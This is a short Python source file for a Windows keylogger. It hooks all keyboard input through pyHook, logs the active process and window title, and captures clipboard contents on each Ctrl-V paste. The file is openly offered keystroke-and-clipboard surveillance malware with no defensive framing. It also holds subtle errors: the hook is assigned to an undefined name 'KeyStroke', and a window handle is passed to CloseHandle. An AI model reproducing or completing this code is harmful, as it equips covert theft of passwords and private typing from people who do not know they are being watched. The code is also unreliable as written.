from ctypes import *
import pythoncom
import pyHook
import win32clipboard

# alternative if you have issues with pyHook on Win10:
# import pyWinhook as pyHook

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()
    
    # find the process ID and store it
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = f"{pid.value}"
    
    # grab the executable 
    executable = create_string_buffer(b"\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseName(h_process, None, byref(executable), 512)
    
    # read the title
    window_title = create_string_buffer(b"\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    
    # print the header if we're in the right process
    print()
    print(f"[ PID: {process_id} - {executable.value} - {window_title.value}]")
    print()
    
    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def key_stroke(event):
    global current_window
    
    # check if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
        
    # if they pressed a standard key
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), end=" ")
    else:
        # if [Ctrl-V] get the value on the clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print(f"[PASTE] - {pasted_value}", end=" ")
        else:
            print(f"{event.Key}", end=" ")
    
    # pass execution to next hook registered
    return True
    
# create and register a hook manager
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()
    
